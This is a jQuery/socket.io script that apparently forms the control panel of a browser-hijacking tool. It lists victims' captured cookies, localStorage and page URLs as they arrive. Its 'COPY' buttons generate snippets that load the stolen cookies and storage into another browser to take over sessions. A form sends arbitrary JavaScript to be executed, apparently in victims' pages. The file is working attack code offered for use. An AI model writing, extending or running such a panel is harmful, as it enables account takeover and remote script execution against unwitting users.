$(function () {
  const copyToClipboard = str => {
    const el = document.createElement('textarea');  // Create a <textarea> element
    el.value = str;                                 // Set its value to the string that you want copied
    el.setAttribute('readonly', '');                // Make it readonly to be tamper-proof
    el.style.position = 'absolute';
    el.style.left = '-9999px';                      // Move outside the screen to make it invisible
    document.body.appendChild(el);                  // Append the <textarea> element to the HTML document
    const selected =
      document.getSelection().rangeCount > 0        // Check if there is any content selected previously
        ? document.getSelection().getRangeAt(0)     // Store selection if found
        : false;                                    // Mark as false to know no selection existed before
    el.select();                                    // Select the <textarea> content
    document.execCommand('copy');                   // Copy - only works as a result of a user action (e.g. click events)
    document.body.removeChild(el);                  // Remove the <textarea> element
    if (selected) {                                 // If a selection existed before copying
      document.getSelection().removeAllRanges();    // Unselect everything on the HTML document
      document.getSelection().addRange(selected);   // Restore the original selection
    }
  };

  function getDataCard(data) {
    const date = (new Date()).toLocaleString();
    const html = `
            <div class="card" style="display: none;" >
              <div class="card-header">
                <b>Session:</b> <span class="data-session-id" ></span>
                <b class="card-header-date" ></b>
              </div>
              <div class="card-body">
                <div class="page-url-section" >
                   <h5 class="card-title">Page:</h5>

                   <p class="card-text"></p> 
                   
                   <div class="card-break" ></div>
                </div>
 
                <div class="cookies-section" >
                    <h5 class="card-title">
                      Cookies: <a href="#" class="card-title-action" >COPY</a>
                    </h5>

                    <pre class="card-text" ></pre>

                    <div class="card-break" ></div>      
                </div>

                <div class="local-storage-section" >
                  <h5 class="card-title">Local Storage: <a href="#" class="card-title-action" >COPY</a></h5>
  
                  <pre class="card-text" ></pre>              
                </div>

              </div>
            </div>
    `;

    const cardViewObject = $(html);

    $('.data-session-id', cardViewObject).text(data.sessionId);
    $('.card-header-date', cardViewObject).text(date);

    $(".page-url-section .card-text", cardViewObject).text(data.url);

    $(".cookies-section .card-title-action", cardViewObject).click(function() {
      const code = `const myCookies = "${data.cookies}".split(';'); for (let i in myCookies) document.cookie = myCookies[i]; `;

      copyToClipboard(code);

      return false;
    });

    $(".cookies-section .card-text", cardViewObject).text(data.cookies.split(';').join("\n"));

    $(".local-storage-section .card-title-action", cardViewObject).click(function() {
      const code = `const storageData = ${JSON.stringify(data.localStorage)}; for (let i in storageData) localStorage.setItem(i, storageData[i]); `;

      copyToClipboard(code);

      return false;
    });
    $(".local-storage-section .card-text", cardViewObject).text(JSON.stringify(data.localStorage, null, 2));

    return cardViewObject;
  }

  const socket = io();

  socket.on('data', function(data){
    console.log('New Data Received', data);
    const viewObject = getDataCard(data);
    $('#data-container').prepend(viewObject);

    viewObject.slideDown();
  });

  $("#form-execute-js button").click(function() {
    socket.emit('execute-js', {
      code: $("#form-execute-js textarea").val()
    });

    return false;
  });
});
